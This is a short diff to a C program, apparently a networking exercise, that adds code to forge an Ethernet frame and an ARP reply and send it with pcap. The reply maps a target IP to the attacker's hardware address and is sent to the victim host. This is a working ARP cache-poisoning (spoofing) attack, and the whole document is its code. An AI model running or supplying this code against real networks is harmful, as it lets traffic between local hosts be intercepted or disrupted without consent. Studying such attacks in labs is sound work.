@@ -2,7 +2,7 @@
 
 int main(int argc, char* argv[]) {
 	my_assert(argc == 4, "syntax: ./%s <interface> <send ip> <target ip>\n", argv[0]);
-	
+
 
 	struct in_addr 		attack_ip, sender_ip, target_ip;
 	struct ether_addr 	attack_ha, sender_ha, target_ha;
@@ -29,10 +29,14 @@ int main(int argc, char* argv[]) {
 	my_assert( GetHA(handle, &attack_ha, &attack_ip, &target_ha, &target_ip), "Error On Getting target(%s) Hardware Address\n", argv[3]);
 	printf("- Taeget_HA: %s\n",usr_ether_ntoa(&target_ha));
 
-	
+
+	unsigned char *packet = (unsigned char *)malloc(ETHER_MAX_LEN);
+	size_t tot_len = 0, len;
+	my_assert( (len = GenEtherPacket(packet, &sender_ha, &attack_ha, ETHERTYPE_ARP)) >= 0, "Error on Generate Ether Packet!\n"); tot_len += len;
+	my_assert( (len = GenARPPacket(packet+tot_len, ARPOP_REPLY, &attack_ha, &target_ip, &sender_ha, &sender_ip)) >= 0, "Error on Generate ARP Packet\n"); tot_len += len;
+
+	my_assert( pcap_sendpacket(handle, packet, tot_len) == 0, "Error sending the packet: %s\n", pcap_geterr(handle));
 
 
-
-	
 	return 0;
 }
